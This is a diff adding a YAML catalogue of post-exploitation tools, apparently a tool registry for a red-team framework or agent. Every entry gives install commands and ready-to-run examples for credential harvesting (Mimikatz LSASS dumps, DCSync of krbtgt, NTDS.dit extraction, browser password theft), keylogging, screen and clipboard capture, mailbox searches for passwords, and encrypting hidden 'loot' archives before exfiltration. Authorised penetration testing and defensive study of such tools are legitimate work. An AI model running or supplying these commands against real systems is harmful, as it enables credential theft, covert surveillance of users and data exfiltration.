@@ -1,0 +1,130 @@
+lazagne:
+  description: "Multi-platform credential recovery — browsers, mail, databases, sysadmin, WiFi"
+  category: "credential_harvesting"
+  install_cmd: "pip3 install lazagne"
+  verify_cmd: "lazagne --help 2>&1 | head -1"
+  examples:
+    - "python3 laZagne.py all"
+    - "python3 laZagne.py browsers"
+    - "python3 laZagne.py all -oJ"
+
+mimikatz:
+  description: "Windows credential extraction — LSASS dump, hashes, tickets, DPAPI"
+  category: "credential_harvesting"
+  install_cmd: "apt-get install -y mimikatz"
+  verify_cmd: "which mimikatz"
+  examples:
+    - "mimikatz # sekurlsa::logonpasswords"
+    - "mimikatz # lsadump::sam"
+    - "mimikatz # lsadump::dcsync /user:DOMAIN\\krbtgt"
+
+secretsdump:
+  description: "Impacket remote/offline credential extraction — SAM, LSA, NTDS.dit"
+  category: "credential_harvesting"
+  install_cmd: "pip3 install impacket"
+  verify_cmd: "secretsdump.py --help 2>&1 | head -1"
+  examples:
+    - "secretsdump.py domain/user:pass@target"
+    - "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL"
+    - "secretsdump.py -sam SAM -system SYSTEM LOCAL"
+
+sharpchromium:
+  description: ".NET Chromium browser data extractor — passwords, cookies, history"
+  category: "credential_harvesting"
+  install_cmd: "Compile from https://github.com/djhohnstein/SharpChromium"
+  verify_cmd: "SharpChromium.exe --help"
+  examples:
+    - "SharpChromium.exe logins"
+    - "SharpChromium.exe cookies"
+    - "SharpChromium.exe all"
+
+firefox_decrypt:
+  description: "Cross-platform Firefox/Thunderbird password extractor"
+  category: "credential_harvesting"
+  install_cmd: "pip3 install firefox-decrypt"
+  verify_cmd: "python3 firefox_decrypt.py --help 2>&1 | head -1"
+  examples:
+    - "python3 firefox_decrypt.py"
+    - "python3 firefox_decrypt.py --format json"
+
+seatbelt:
+  description: "GhostPack .NET security audit — credential stores, browser data, interesting files"
+  category: "enumeration"
+  install_cmd: "Compile from https://github.com/GhostPack/Seatbelt"
+  verify_cmd: "Seatbelt.exe -h"
+  examples:
+    - "Seatbelt.exe -group=all"
+    - "Seatbelt.exe CredEnum CloudCredentials InterestingFiles"
+
+keyscan_msf:
+  description: "Meterpreter keylogger module — capture keystrokes on compromised host"
+  category: "input_capture"
+  install_cmd: "apt-get install -y metasploit-framework"
+  verify_cmd: "msfconsole -v"
+  examples:
+    - "meterpreter > keyscan_start"
+    - "meterpreter > keyscan_dump"
+    - "meterpreter > keyscan_stop"
+
+screenshot_msf:
+  description: "Meterpreter screenshot module — capture target screen"
+  category: "screen_capture"
+  install_cmd: "apt-get install -y metasploit-framework"
+  verify_cmd: "msfconsole -v"
+  examples:
+    - "meterpreter > screenshot"
+    - "meterpreter > run post/multi/gather/screen_spy DELAY=5 COUNT=10"
+
+xclip:
+  description: "Linux clipboard access utility — read/write X11 clipboard"
+  category: "input_capture"
+  install_cmd: "apt-get install -y xclip"
+  verify_cmd: "which xclip"
+  examples:
+    - "xclip -selection clipboard -o"
+    - "xclip -selection clipboard -o > /tmp/.clip"
+
+xwd_import:
+  description: "X11 screenshot tools — xwd and ImageMagick import"
+  category: "screen_capture"
+  install_cmd: "apt-get install -y x11-apps imagemagick"
+  verify_cmd: "which import"
+  examples:
+    - "xwd -root -out /tmp/screen.xwd"
+    - "import -window root /tmp/screen.png"
+
+mailsniper:
+  description: "PowerShell Exchange/O365 mailbox search — find passwords and sensitive data"
+  category: "email_collection"
+  install_cmd: "Download from https://github.com/dafthack/MailSniper"
+  verify_cmd: "Get-Command Invoke-SelfSearch"
+  examples:
+    - "Invoke-SelfSearch -Mailbox user@domain.com -ExchHostname mail.domain.com -Terms 'password','vpn'"
+    - "Invoke-GlobalMailSearch -ImpersonationAccount admin@domain.com -ExchHostname mail.domain.com"
+
+tar:
+  description: "Unix archiving — create compressed archives for data staging"
+  category: "data_staging"
+  install_cmd: ""
+  verify_cmd: "tar --version"
+  examples:
+    - "tar czf /tmp/.data.tar.gz /path/to/loot/"
+    - "tar czf - /path/to/data | openssl enc -aes-256-cbc -pbkdf2 -out /tmp/.data.enc -k pass"
+
+7z:
+  description: "7-Zip archiver with AES-256 encryption and hidden filenames"
+  category: "data_staging"
+  install_cmd: "apt-get install -y p7zip-full"
+  verify_cmd: "7z --help 2>&1 | head -1"
+  examples:
+    - "7z a -p'P@ssw0rd!' -mhe=on archive.7z /path/to/files"
+    - "7z a -p'P@ssw0rd!' -v512k archive.7z files"
+
+openssl:
+  description: "Encryption toolkit — AES-256 encrypt staged data before exfiltration"
+  category: "data_staging"
+  install_cmd: "apt-get install -y openssl"
+  verify_cmd: "openssl version"
+  examples:
+    - "openssl enc -aes-256-cbc -salt -pbkdf2 -in data.tar.gz -out data.enc -k password"
+    - "openssl enc -d -aes-256-cbc -pbkdf2 -in data.enc -out data.tar.gz -k password"
